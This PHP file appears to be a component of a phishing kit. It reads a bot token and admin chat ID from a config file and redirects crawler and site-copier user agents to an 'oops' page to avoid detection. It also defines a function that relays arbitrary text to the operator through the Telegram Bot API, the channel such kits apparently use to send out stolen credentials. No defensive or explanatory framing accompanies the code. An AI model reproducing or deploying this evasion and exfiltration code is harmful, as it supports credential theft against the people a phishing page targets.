<?php
$timestamp = $_SERVER['REQUEST_TIME'];
$setting = json_decode(file_get_contents("../_rules.json"), TRUE);
$CCODE  = $setting["ccode"];
$TITLE  = $setting["title"];
$BOTKN  = $setting["token"];
$ADMID  = $setting["admid"];

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) { header('Location: oops.php'); die(); }

function sendMessage($text) {
    global $BOTKN;
    global $ADMID;
    $url = "https://api.telegram.org/bot" . $BOTKN . "/sendMessage?parse_mode=markdown&chat_id=" . $ADMID . "&text=" . urlencode($text);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
?>